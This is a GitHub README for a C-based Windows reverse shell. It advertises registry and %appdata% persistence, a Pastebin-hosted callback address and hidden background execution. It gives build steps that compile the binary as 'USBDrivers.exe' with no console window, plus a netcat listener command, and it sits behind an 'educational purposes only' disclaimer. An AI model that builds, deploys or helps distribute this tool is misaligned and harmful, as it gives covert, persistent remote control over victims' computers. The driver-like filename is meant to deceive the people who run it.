<h1 align="center">C.ReverseShell</h1>



<p align="center">
<a href="#"><img alt="logs-ipgrabber forks" src="https://img.shields.io/github/forks/cdkw/logs-ipgrabber?style=for-the-badge"></a>
<a href="#"><img alt="logs-ipgrabber last commit (main)" src="https://img.shields.io/github/last-commit/cdkw/logs-ipgrabber/main?color=green&style=for-the-badge"></a>
<a href="#"><img alt="logs-ipgrabber Repo stars" src="https://img.shields.io/github/stars/cdkw/logs-ipgrabber?style=for-the-badge&color=yellow"></a>
<a href="#"><img alt="logs-ipgrabber License" src="https://img.shields.io/github/license/cdkw/logs-ipgrabber?color=orange&style=for-the-badge"></a>
<a href="https://github.com/cdkw/logs-ipgrabber/issues"><img alt="logs-ipgrabber issues" src="https://img.shields.io/github/issues/cdkw/logs-ipgrabber?color=purple&style=for-the-badge"></a>

<p align="center">⚠️ EDUCATIONAL PURPOSES ONLY - PLEASE READ LEGAL NOTICE ⚠️</p>
<p align="left"><img src="https://i.imgur.com/sQ8bRpe.png" alt="Image"></p>

### **💸 Features**
* Reconnection interval
* Persistence (Registry key, file copied in %appdata%)
* Pastebin IP modification
* Runs in the background


### **📜 Requirements**
* `gcc-mingw-w64` can be installed with `sudo apt install gcc-mingw-w64`
* a linux server/machine to run `nc -nlvp <port>`


### **💾 Installing and Compiling**

```shell script
git clone https://github.com/cdkw/C.ReverseShell.git
cd C.ReverseShell
```
Now go in the `creverse.c` file and modify line 11: `#define PASTEBIN_URL "https://pastebin.com/raw/ENTER_PASTEBIN_HERE"` to your raw pastebin url. (`IP:PORT`)
```sh
gcc creverse.c -o USBDrivers.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -lwininet -static-libstdc++ -static-libgcc -mwindows
```
* NOTE: To change its name from `USBDrivers.exe` to something else make sure to also modify `line 161` to match your filename.


### **⚠️ Legal notice**

This code is provided for **EDUCATIONAL PURPOSES ONLY**. It is intended to demonstrate certain programming concepts and techniques related to network communication and process control. This code should **NOT be used** for any malicious or unauthorized activities.

The author disclaims any responsibility for any misuse of this code and is not liable for any legal consequences that may arise from its use. Always ensure compliance with applicable laws and regulations when using or adapting this code. Do not hack anyone without their consent!

### **☕ Support me!**

If you want to support me, consider joining my discord or donating to my crypto wallets:
* BTC `3QMrNrzGSPunpnYirVFtKp6G4oSnJDk1oT`
* ETH `0xFD03ee7AB099223a4B33327955a9aF3dd3DCDA61`
* SOL `7HDSAnXosAWNiuBwZCv18CdWc9aZCpdNoCBKAf11C7BD`
